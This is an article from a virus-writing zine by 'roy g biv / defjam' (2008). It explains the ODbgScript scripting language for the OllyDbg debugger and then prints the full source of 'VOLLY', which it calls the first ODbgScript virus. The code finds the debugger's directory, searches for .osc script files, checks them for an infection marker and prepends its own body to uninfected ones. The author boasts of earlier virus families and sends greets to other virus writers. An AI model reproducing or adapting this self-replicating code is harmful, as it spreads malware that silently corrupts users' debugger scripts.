                              Extreme ODbgScript
                              roy g biv / defjam

                                 -= defjam =-
                                  since 1992
                     bringing you the viruses of tomorrow
                                    today!


Former  DOS/Win16  virus writer, author of several virus  families,  including
Ginger  (see Coderz #1 zine for terrible buggy example, contact me for  better
sources  ;),  and Virus Bulletin 9/95 for a description of what   they  called
Rainbow.   Co-author  of  world's first virus using circular  partition  trick
(Orsam, coded with Prototype in 1993).  Designer of world's first XMS swapping
virus  (John Galt, coded by RT Fishel in 1995, only 30 bytes stub, the rest is
swapped  out).   Author of world's first virus using Thread Local Storage  for
replication  (Shrug, see Virus Bulletin 6/02 for a description, but they  call
it Chiton), world's first virus using Visual Basic 5/6 language extensions for
replication  (OU812), world's first Native executable virus (Chthon),  world's
first  virus  using process co-operation to prevent termination  (Gemini,  see
Virus  Bulletin 9/02 for a description), world's first virus using polymorphic
SMTP  headers (JunkMail, see Virus Bulletin 11/02 for a description),  world's
first viruses that can convert any data files to infectable objects (Pretext),
world's  first  32/64-bit  parasitic  EPO .NET  virus  (Croissant,  see  Virus
Bulletin  11/04  for a description, but they call it Impanate), world's  first
virus  using  self-executing HTML (JunkHTMaiL, see Virus Bulletin 7/03  for  a
description), world's first virus for Win64 on Intel Itanium (Shrug, see Virus
Bulletin 6/04 for a description, but they call it Rugrat), world's first virus
for  Win64 on AMD AMD64 (Shrug), world's first cross-infecting virus for Intel
IA32  and  AMD  AMD64  (Shrug),  world's  first  viruses  that  infect  Office
applications  and  script  files  using the same  code  (Macaroni,  see  Virus
Bulletin  11/05  for  a description, but they call it Macar),  world's   first
viruses  that  can infect both VBS and JScript using the same code (ACDC,  see
Virus  Bulletin 11/05 for a description, but they call it Cada), world's first
virus  that  can  infect  CHM files (Charm, see Virus  Bulletin  10/06  for  a
description,  but they call it Chamb), world's first IDA plugin virus  (Hidan,
see Virus Bulletin 3/07 for a description), world's first viruses that use the
Microsoft  Script  Encoder  to dynamically encrypt the  virus  body  (Screed),
world's  first virus for StarOffice and OpenOffice (Starbucks), world's  first
virus  IDC  virus (ID10TiC), world's first polymorphic virus for Win64 on  AMD
AMD64  (Boundary, see Virus Bulletin 12/06 for a description, but they call it
Bounds),  world's first virus that can infect Intel-format and  PowerPC-format
Mach-O  files  (MachoMan,  see  Virus Bulletin 01/07 for  a  description,  but
they  call  it  Macarena), world's first virus that uses  Unicode  escapes  to
dynamically encrypt the virus body, world's first self-executing PIF (Spiffy),
world's  first  self-executing  LNK (WeakLNK), world's first virus  that  uses
virtual  code  (Relock), and world's first virus to use FSAVE for  instruction
reordering (Mimix).  Author of various retrovirus articles (eg see Vlad #7 for
the   strings  that  make your code invisible to TBScan).  This  is  my  first
virus for ODbgScript.  It is the world's first virus for ODbgScript.


What is it?

ODbgScript  is  a  plug-in for OllyDbg.  Of course you already  know  what  is
OllyDbg. ;)   ODbgScript  contains  a  scripting language  that  can  automate
OllyDbg.   It  has lots of useful built-in functions, and it can also  execute
assembler code directly for extra functions.


What kind of built-in functions?

ODbgScript  supports local variables, it can push values to the host stack, it
can  pop values from the host stack, it can access the CPU registers directly,
it  can  get  the address of functions in DLLs, it can convert hex  values  to
strings,  it  can write long strings to memory using the MOV command,  it  can
concatenate  strings using the ADD command... and many other things that I did
not  need.   The  documentation is very clear.  You should go  and  read  that
instead. :)


What kind of extra functions?

There  is  a limitation that ODbgScript does not understand selectors,  so  we
cannot  look at fs:[30h] and other places using the scripting language.   What
we  can  do  instead  is to use an execution block.  That is  EXEC  and  ENDE.
Inside  that  block we put the code to run, but it does not support any  local
variables  and strings.  So to access fs:[30h], for example, we could use this
code:

    exec
    mov eax, fs:[30] //all values are in hex, only dword accesses allowed
    ende
    var a //local variable to receive value
    mov a,eax

So  easy.  We can use functions in DLLs by GPA command.  GPA loads the DLL and
returns  the address of the function.  The problem is that DLL is loaded  into
OllyDbg  memory,  not the memory of the file being debugged, so if DLL is  not
there,  then we will crash if we try to call the address.  Also, there can  be
a different address for the DLL because of other DLLs loaded already, but that
is probably a rare thing.


Labels and variables

ODbgScript supports labels and variables.  The variables can be short or long
names,  and they can be declared more than once without error.  This is  good
for  us,  so that the host code will still work even if we have a same  name.
Labels  can  also be declared more than once, but only the first one has  the
effect.  For that reason, it is good idea to guess about unique names.


Other things

ODbgScript   supports  some arithmetic commands like ADD, SUB, XOR, INC,  DEC.
They do not alter the flags.  There is CMP command which does alter the flags.
It is important to remember that because of a likely bug in this code:

    dec a
    jne b

This  code  looks  like  it should branch while a is not zero, but  since  DEC
command  does  not  alter flags, it does not have the right effect.   It  also
means that we can have tricky poly code like this:

    mov a,12345678
    cmp a,12345677
    add a,23456789
    sub a,3579be01
    je  b

Then a is zero but branch is not taken.

Now we look at some real code:

//VOLLY - roy g biv 08/09/08
push eax
push ecx
push edx
sub esp,364                     //space for WIN32_FIND_DATAA and MODULEENTRY32
var a
mov a,esp
mov [a],#75736572333200#        //"user32"
push a
var b
mov b,"kernel32"
gpa "LoadLibraryA",b
mov eax,$RESULT
exec
call eax                        //load user32.dll
ende
mov [a],#4f4c4c5944424700#      //"OLLYDBG"
push 0
push a
gpa "FindWindowA","user32"
mov eax,$RESULT
exec
call eax                        //find OllyDbg window
ende
cmp eax,0
je j                            //quit if hidden
push a
push eax
gpa "GetWindowThreadProcessId","user32"
mov eax,$RESULT
exec
call eax                        //get OllyDbg PID
ende
push c
gpa "CreateToolhelp32Snapshot",b
mov eax,$RESULT
exec
call eax                        //snapshot only OllyDbg process
ende
var c
mov c,224                       //sizeof(MODULEENTRY32)
push c
push eax
push a
push eax
gpa "Module32First",b
mov eax,$RESULT
exec
call eax                        //get OllyDbg pathname
ende
var d
mov d,eax
gpa "CloseHandle",b
var e
mov e,$RESULT
mov eax,e
exec
call eax
ende
cmp d,0
je j                            //quit if not found
mov d,a
add d,120
find d,#00#                     //find string end
var f
mov f,$RESULT
var g
a:
dec f
mov g,[f]
and g,ff
cmp g,5c                        //find last '\'
jne a
mov [f],#5c2a2e6f736300#        //append "\*.osc"
add c,a
mov f,0
mov g,1
var h
var i
var j
var k
var l
var m
var n
var o
b:
push c
push d
gpa "FindFirstFileA",b
mov eax,$RESULT
exec
call eax                        //find a .osc file
ende                            //one must exist because we run
mov h,eax
mov i,0
c:
mov j,c
add j,2c
push 0
push 0
push 3
push 0
push 0
push c0000000
push j
gpa "CreateFileA",b
mov eax,$RESULT
exec
call eax                        //open it
ende
cmp eax,0
je h
mov j,eax
push 0
push j
gpa "GetFileSize",b
mov eax,$RESULT
exec
call eax                        //get size
ende
mov k,eax
alloc k                         //allocate size
cmp eax,0
je g                            //skip if allocate failed
mov l,$RESULT
push 0
push a
push k
push l
push j
gpa "ReadFile",b
mov eax,$RESULT
exec
call eax                        //read whole file
ende
mov eax,l
find l,#2f2f564f#               //search for infection marker
cmp $RESULT,0
je d                            //branch if not infected
cmp f,0                         //no way to access script directly
jne f                           //so we search for an infected file
inc f                           //mark found code
inc i                           //mark restart scan
find l,#2f2f65#                 //find code end
mov m,$RESULT
add m,5
sub m,l                         //calculate length (could use hard-coded value)
alloc m                         //allocate size
mov n,$RESULT
mov [n],[l],m                   //memcpy code
jmp f
d:
cmp f,0
je f                            //branch if not found code yet
push 0
push 0
push 0
push j
gpa "SetFilePointer",b
mov eax,$RESULT
exec
call eax                        //seek to start
ende
push 0
push a
push k
push l
push 0
push a
push m
push n
mov o,2
e:
push j
gpa "WriteFile",b
mov eax,$RESULT
exec
call eax                        //prepend our code then append old code
ende
dec o
cmp o,0
jne e
f:
free l
g:
push j
mov eax,e
exec
call eax                        //close file
ende
cmp i,0
jne i                           //skip if must restart scan
h:
push c
push h
gpa "FindNextFileA",b
mov eax,$RESULT
exec
call eax                        //find another file
ende
mov g,eax
cmp g,0
jne c                           //loop if more files
i:
push h
gpa "FindClose",b
mov eax,$RESULT
exec
call eax
ende
cmp g,0                         //check for restart
jne b                           //once we have our code, we can infect
free n
j:
add esp,364
pop edx
pop ecx
pop eax//e                      //end marker

I know that I could put more into EXEC/ENDE blocks, but I wanted to be as much
script as possible, so only APIs are there.


Greets to friendly people (A-Z):

Active - Benny - izee - Malum - Obleak - Prototype - Ratter - Ronin -
RT Fishel - sars - SPTH - The Gingerbread Man - Ultras - uNdErX - Vallez -
Vecna - VirusBuster - Whitehead


rgb/defjam sep 2008
iam_rgb@hotmail.com
